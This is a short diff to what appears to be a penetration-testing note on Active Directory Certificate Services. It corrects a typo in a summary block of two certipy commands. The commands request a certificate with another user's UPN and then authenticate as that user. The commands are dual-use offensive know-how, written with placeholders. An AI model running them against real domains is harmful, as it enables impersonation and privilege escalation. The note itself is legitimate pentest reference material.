@@ -63,7 +63,7 @@ C:\>
 ### Summary
 
 ```bash
-certipy req -u <user>@<domain> -p '<password>' -template <template> -ca <ca> -upn <target_user>@<domain -dc-ip <adcs_ip>
+certipy req -u <user>@<domain> -p '<password>' -template <template> -ca <ca> -upn <target_user>@<domain> -dc-ip <adcs_ip>
 certipy auth -pfx <target_user>.pfx -dc-ip <dc_ip>
 ```
 
